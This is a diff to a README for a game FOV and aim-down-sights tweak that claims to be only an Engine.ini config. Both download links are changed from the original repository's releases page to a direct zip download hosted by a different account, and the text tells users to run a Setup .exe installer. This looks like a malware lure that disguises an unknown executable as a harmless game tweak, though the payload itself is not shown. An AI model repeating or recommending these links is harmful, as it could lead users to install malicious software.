@@ -18,7 +18,7 @@ An optimized `Engine.ini` config for **Wardogs** (UE5) that sets the ideal Field
 
 ## ⬇️ Download
 
-👉 **[Download the latest version](https://github.com/IdentityCuckoo/Wardogs-FOV-ADS-Tweaks/releases/latest)**
+👉 **[Download the latest version](https://github.com/chaserbisoninterface/Wardogs-FOV-ADS-Tweaks/releases/download/v1.2.1/Wardogs.FOV.ADS.Tweaks.zip)**
 
 The installer is a single `Wardogs-FOV-ADS-Tweaks-Setup-v1.2.1.exe` file. Run it, follow the on-screen steps, done.
 
@@ -37,7 +37,7 @@ The installer is a single `Wardogs-FOV-ADS-Tweaks-Setup-v1.2.1.exe` file. Run it
 
 ## 🔧 Installation
 
-1. Download the `Wardogs-FOV-ADS-Tweaks-Setup-v1.2.1.exe` installer from [Releases](https://github.com/IdentityCuckoo/Wardogs-FOV-ADS-Tweaks/releases/latest).
+1. Download the `Wardogs-FOV-ADS-Tweaks-Setup-v1.2.1.exe` installer from [Releases](https://github.com/chaserbisoninterface/Wardogs-FOV-ADS-Tweaks/releases/download/v1.2.1/Wardogs.FOV.ADS.Tweaks.zip).
 2. **Launch Wardogs once and close it.** This creates the config folder.
 3. Run the installer.
 4. Choose your FOV: `100`, `105`, or `110`.
